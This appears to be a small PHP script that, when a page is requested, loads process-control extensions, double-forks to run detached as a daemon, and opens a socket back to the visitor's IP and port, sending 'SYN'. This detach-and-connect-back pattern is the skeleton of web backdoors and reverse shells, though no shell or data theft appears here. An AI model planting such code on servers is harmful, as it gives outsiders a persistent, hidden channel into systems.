<?php
$errstr = $errno = 0;
$daemon = true;
$port = $_SERVER["REMOTE_PORT"];
$ip = $_SERVER["REMOTE_ADDR"];
var_dump($ip);
if (!function_exists('pcntl_fork')) {
    dl('pcntl.so');
}
if(!function_exists('posix_setsid')) {
    dl('posix.so');
}
if ($daemon) {
    $pid = pcntl_fork();
    if ($pid < 0) {
        exit('fork error');
    }
    if ($pid > 0) {
        exit();
    }
    $secForkPid = pcntl_fork();
    if ($secForkPid == -1) {
        exit('fork #2 error');
    }
    if ($secForkPid > 0) {
        exit();
    }
    chdir('/');
    umask('0');
    posix_setsid();
}

$fp = fsockopen($ip, $port, $errno, $errstr, 30);

if($fp) {
    $port = stream_socket_get_name($fp, false);
    fwrite($fp, 'SYN');
}